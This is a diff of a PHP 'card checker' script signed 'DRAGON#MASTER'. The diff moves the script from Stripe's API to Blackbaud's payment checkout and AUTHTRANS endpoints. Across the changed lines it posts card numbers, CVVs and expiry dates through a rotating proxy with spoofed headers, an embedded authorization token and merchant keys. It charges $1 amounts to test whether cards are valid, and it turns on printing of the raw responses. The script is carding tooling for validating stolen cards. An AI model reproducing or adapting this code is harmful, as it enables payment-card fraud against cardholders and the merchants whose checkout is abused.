@@ -112,19 +112,20 @@ echo '[ IP: '.$ip.' ] ';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+curl_setopt($ch, CURLOPT_URL, 'https://payments.blackbaud.com/api/Checkout');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: api.stripe.com',
+'authority: payments.blackbaud.com',
 'method: POST',
-'path: /v1/payment_methods',
+'path: /api/Checkout',
 'scheme: https',
 'accept: application/json',
 'accept-language: en-US,en;q=0.9',
-'content-type: application/x-www-form-urlencoded',
-'origin: https://js.stripe.com',
-'referer: https://js.stripe.com/',
+'authorization: Basic VE9LRU5VU0VSOjRiOTE0NmNmLWE0NjQtNDQxMC04OWI2LWRmNThlNDk4ZGQ0YQ==',
+'content-type: application/json',
+'origin: https://8913.blackbaudhosting.com',
+'referer: https://8913.blackbaudhosting.com/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site',
@@ -139,19 +140,19 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]=Douglas+H+Smith&billing_details[email]='.$email.'&billing_details[address][country]=US&billing_details[address][line1]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][postal_code]='.$zip.'billing_details[address][state]='.$state.'&guid=5f38e8fd-6de6-4347-a4d3-80e9f1677f2984234f&muid=fcb52d26-f9fc-438b-801c-7079cac783d1b9b21a&sid=25a331a8-c183-47a0-b151-d8c76d386042e542de&key=pk_live_0zkFa9UrUl37HqqvVjhvrdkh&payment_user_agent=stripe.js%2F5db0321f4%3B+stripe-js-v3%2F5db0321f4%3B+checkout');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"BillingAddress":{"Email":"'.$email.'","Line":"'.$street.'","City":"'.$city.'","State":"'.$state.'","PostCode":"'.$zip.'","Country":"US","Phone":"'.$phone.'"},"Key":"4b9146cf-a464-4410-89b6-df58e498dd4a","MerchantAccountId":"80cc9bfe-5ceb-4cff-9aae-cb683f715f0d","Amount":"11.00","ClientAppName":"Altru Web Forms","Cardholder":"'.$name.' '.$last.'","Note":"Sales Order Cart","UseCaptcha":"False","UseMasterpass":"False","UseVisaCheckout":false,"UseApplePay":false,"Description":"Sales Order Cart","SourceCode":0,"UsePayPal":true,"ClientDomain":"8913.blackbaudhosting.com","PrimaryColor":"","SecondaryColor":"","FontColor":"","FontFamily":"","UseApplePayDonateButton":false}');
 
 
 
 $result1 = curl_exec($ch);
-$id = trim(strip_tags(getStr($result1,'"id": "','"')));
+$id = trim(strip_tags(getStr($result1,'"Token": "','"')));
 
 # -------------------- [2 REQ] -------------------#
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/ppage_1ITUKnLSk038ZBy0J25tTexk/confirm');
+curl_setopt($ch, CURLOPT_URL, 'https://payments.blackbaud.com/WebMethods/PaymentServices.ashx?t=c82d9376-e7c4-420d-a392-0287174344cc&action=AUTHTRANS');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -162,16 +163,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: api.stripe.com',
+'authority: payments.blackbaud.com',
 'method: POST',
-'path: /v1/payment_pages/ppage_1ITUKnLSk038ZBy0J25tTexk/confirm',
+'path: /WebMethods/PaymentServices.ashx?t=c82d9376-e7c4-420d-a392-0287174344cc&action=AUTHTRANS',
 'scheme: https',
-'accept:application/json',
+'accept: */*',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded',
 //'cookie: #',
-'origin: https://checkout.stripe.com',
-'referer: https://checkout.stripe.com/',
+'origin: https://payments.blackbaud.com',
+'referer: https://payments.blackbaud.com/Pages/Checkout.aspx?t=c82d9376-e7c4-420d-a392-0287174344cc&v=2.0',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -180,7 +181,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'eid=NA&payment_method='.$id.'&expected_amount=1500&shipping[address][line1]=Po+Box+310&shipping[address][city]=Fleischmanns&shipping[address][country]=US&shipping[address][postal_code]=10080&shipping[address][state]=NY&shipping[name]=Douglas+H+Smith&key=pk_live_0zkFa9UrUl37HqqvVjhvrdkh');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'cardholdername='.$name.'%20'.$last.'&cardnumber='.$cc.'&expiry='.$mes.'%2F'.$ano.'&csc='.$cvv.'&iinHidden=&amount=1.00&originalamount=1.00&firstname=&lastname=&email=soy147n%40yahoo.com&phone=(202)%20405-1548&addr=145%20new%20York%20city&city=New%20York&stateHidden=08f8e7c1-d8b9-4391-84a9-702bbc71f7ef&postal='.$zip.'&countryHidden=d74936d8-7394-4dc2-bba6-424ab5f053cc');
 
 
 $result2 = curl_exec($ch);
@@ -444,8 +445,8 @@ else {
 curl_close($ch);
 ob_flush();
 
-//echo "<b>1REQ Result:</b> $result1<br><br>";
-//echo "<b>2REQ Result:</b> $result2<br><br>";
+echo "<b>1REQ Result:</b> $result1<br><br>";
+echo "<b>2REQ Result:</b> $result2<br><br>";
 
 #---------------------------------------------------------------------------------------------------------------------------------#
 #---------------------------------------------------[MADE BY 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹]----------------------------------------------------#
